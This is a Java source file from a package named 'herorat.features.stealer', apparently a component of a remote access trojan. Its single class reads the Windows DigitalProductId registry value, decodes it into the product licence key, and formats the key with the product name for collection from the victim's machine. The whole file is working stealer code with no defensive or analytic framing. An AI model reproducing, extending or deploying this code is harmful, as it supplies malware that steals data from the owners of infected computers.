package net.herorat.features.stealer;

public class StealerWindows
{
	public static String getLogin()
	{
		String os = System.getProperty("os.name", "").toLowerCase();
		if (os.contains("win"))
		{
			char[] dpid = new char[100];
			String serial_encrypted = Registry.readRegistry("HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\Windows NT\\CurrentVersion", "DigitalProductId");
			if (serial_encrypted != null)
			{
				System.out.println("SERIAL: " + serial_encrypted);
				for (int i=52; i<=66; i++)
				{
					dpid[i - 52] = (char)(serial_encrypted.getBytes()[i]);
				}
				
				String key = "";
				int x;
				for (int a=24; a>=0; a--)
				{
					x = 0;
					for (int b=14; b>=0; b--)
					{
						x = (x * 256) ^ dpid[b];
						dpid[b] = (char)(x / 24);
						x = x % 24;
					}
					key += base24(x);
					if ((a % 5 == 0) && (a != 0))
					{
						key += "-";
					}
				}
				
				StringBuffer buffer = new StringBuffer();
				buffer.append("---------- Windows ----------\n");
				buffer.append("Serial: ");
				buffer.append(key);
				buffer.append("\nName: ");
				buffer.append(Registry.readRegistry("HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\Windows NT\\CurrentVersion", "ProductName"));
				buffer.append("\n-----------------------------\n\n");

				return buffer.toString();
			}
		}

		return "";
	}
	
	private static String base24(int hex)
	{
		switch(hex)
		{
			case 0:
				return "B";
			case 1:
				return "C";
			case 2:
				return "D";
			case 3:
				return "F";
			case 4:
				return "G";
			case 5:
				return "H";
			case 6:
				return "J";
			case 7:
				return "K";
			case 8:
				return "M";
			case 9:
				return "P";
			case 10:
				return "Q";
			case 11:
				return "R";
			case 12:
				return "T";
			case 13:
				return "V";
			case 14:
				return "W";
			case 15:
				return "X";
			case 16:
				return "Y";
			case 17:
				return "2";
			case 18:
				return "3";
			case 19:
				return "4";
			case 20:
				return "6";
			case 21:
				return "7";
			case 22:
				return "8";
			case 23:
				return "9";
			default:
				return "";
		}
	}
}